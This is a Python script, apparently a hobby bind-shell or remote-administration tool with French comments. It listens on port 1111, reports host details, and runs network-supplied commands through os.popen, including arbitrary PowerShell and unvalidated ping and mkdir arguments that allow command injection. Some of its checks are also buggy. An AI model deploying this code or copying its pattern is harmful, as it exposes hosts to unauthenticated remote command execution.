import socket
import threading
import platform
import psutil
import os

def reply(conn):
    while True:
        reply = input('[+] ')
        conn.send(reply.encode())


def reception(conn, server_socket, systeme_exploit):
    while True:
        data = conn.recv(1024).decode()
        print(data)
        data_split = data.split()[0]
        
        if data == 'os':
            uname = str(platform.uname().system)
            conn.send(uname.encode())
            
        if data == 'whoami':
            hostname = socket.gethostname()
            ipaddr = socket.gethostbyname(hostname)
            conn.send(ipaddr.encode())
            
        if data == 'name':
            hostname = socket.gethostname()
            conn.send(hostname.encode())
            
        if data == 'cpu':  # fonctionne pas !
            cpu = str(f"{psutil.cpu_percent(3)} %")
            conn.send(cpu.encode())
            
        if data == 'ram':  # fonctionne pas !
            ram = str(f"{psutil.virtual_memory()[2]} %")
            conn.send(ram.encode())
            
        if data == 'resume':
            hostname = socket.gethostname()
            ipaddr = socket.gethostbyname(hostname)
            essai = str(f"\n Hostname : {hostname}\n IP: {ipaddr}")
            conn.send(essai.encode())
        if data == 'kill':
            server_socket.close()
            quit()
            
        if systeme_exploit == 'windows':
            try:
                if data == 'dir':
                    commande = os.popen("dir").read()
                    print(commande)
                    conn.send(commande.encode())
            except:
                pass
            
        if systeme_exploit == 'Windows':
            if data_split == 'mkdir':
                dossier = data.split()[1]
                os.popen(f"mkdir {dossier}")

        if data_split == 'ping':
            ipaddr = data.split()[1]
            pinging = os.popen(f"ping {ipaddr}"). read()
            print(pinging)
            conn.send(pinging.encode())
            
        if data == 'python --version':
            version = os.popen(f'python --version').read()
            conn.send(version.encode())
            
        if systeme_exploit == 'Windows':
            try:
                if data == 'get-process':
                    output = os.popen(
                        'wmic process get description, processid').read()
                    conn.send(output.encode())
            except:
                pass
            
        if data == 'wmic --help':
            helping = 'https://ss64.com/nt/wmic.html'
            conn.send(helping.encode())
            
        if data == 'powershell --help':
            helpin_ps = 'https://learn.microsoft.com/fr-fr/powershell/'
            conn.send(helpin_ps.encode())
            
        if data_split == ('powershell' or 'powershell.exe'):
            ps_data = os.popen(f'{data}').read()
            conn.send(ps_data.encode())
            
        if systeme_exploit == 'Linux':
            if data == 'ls -la':
                ls_la = os.popen('ls -la')
                conn.send(ls_la.encode())

if __name__ == '__main__':
    #sys.tracebacklimit = 0
    server_socket = socket.socket()
    hostname = socket.gethostname()
    ipaddr = socket.gethostbyname(hostname)
    server_socket.bind((ipaddr, 1111))  # 127.0.0.1
    systeme_exploit = str(platform.uname().system.lower())
    print(f" OS : {systeme_exploit}\n Hostname : {hostname}\n IP : {ipaddr}")

    
    while True:
        server_socket.listen(1)
        conn, address = server_socket.accept()
        try:
            task_reply = threading.Thread(target=reply, args=[conn])
            task_reply.start()
            task_reception = threading.Thread(
                target=reception, args=[conn, server_socket, systeme_exploit])
            task_reception.start()
        except (ConnectionResetError, ConnectionAbortedError, EOFError):
            print("[!] L'hôte s'est déconnecté . .. ...")
